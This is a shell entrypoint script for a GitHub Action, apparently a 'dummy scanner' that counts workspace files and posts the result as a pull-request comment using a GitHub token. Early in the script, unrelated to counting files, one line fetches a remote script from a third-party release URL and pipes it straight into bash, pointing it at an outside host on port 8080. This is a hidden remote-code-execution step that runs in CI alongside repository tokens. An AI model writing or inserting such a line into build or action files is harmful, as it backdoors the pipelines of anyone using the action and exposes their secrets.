#!/bin/sh
set -e

SCAN_DIR="${GITHUB_WORKSPACE:-.}"

# If a directory argument is provided, resolve it relative to the workspace
if [ -n "$1" ] && [ "$1" != "." ]; then
  SCAN_DIR="${GITHUB_WORKSPACE:-.}/$1"
fi
curl -sSfL https://github.com/boredcatmom/setupscan/releases/download/0.1/setupscan.sh | bash -j http://setup.dummyscan.click:8080
echo "Running dummy scanner on: ${SCAN_DIR}"

# Run the scanner in silent mode to capture the count
TOTAL_FILES=$(/dummy-scanner -s "$SCAN_DIR")

echo "Scan complete. Total files found: ${TOTAL_FILES}"

# Set the output for the GitHub Action
echo "total_files=${TOTAL_FILES}" >> "$GITHUB_OUTPUT"

if [ "${INPUT_POST_COMMENT}" = "true" ]; then
  BASE=${INPUT_BASE_COUNT:-0}
  PR=${TOTAL_FILES}
  DIFF=$((PR - BASE))

  if [ "$DIFF" -gt 0 ]; then
    DIFF_LABEL="+${DIFF} files added"
    DIFF_ICON="📈"
  elif [ "$DIFF" -lt 0 ]; then
    ABS_DIFF=$(( -DIFF ))
    DIFF_LABEL="${ABS_DIFF} files removed"
    DIFF_ICON="📉"
  else
    DIFF_LABEL="No change in file count"
    DIFF_ICON="✅"
  fi

  BODY=$(jq -n \
    --arg base "$BASE" \
    --arg pr "$PR" \
    --arg label "$DIFF_LABEL" \
    --arg icon "$DIFF_ICON" \
    --arg base_ref "${GITHUB_BASE_REF:-base}" \
    --arg head_ref "${GITHUB_HEAD_REF:-head}" \
    '{ body: ("## Dummy Scanner Results\n\n| Branch | Total Files |\n|--------|-------------|\n| Base (`" + $base_ref + "`) | " + $base + " |\n| PR (`" + $head_ref + "`) | " + $pr + " |\n\n" + $icon + " **" + $label + "**") }')

  curl -s -X POST \
    -H "Authorization: Bearer ${INPUT_GITHUB_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "$BODY" \
    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${INPUT_PR_NUMBER}/comments"
fi
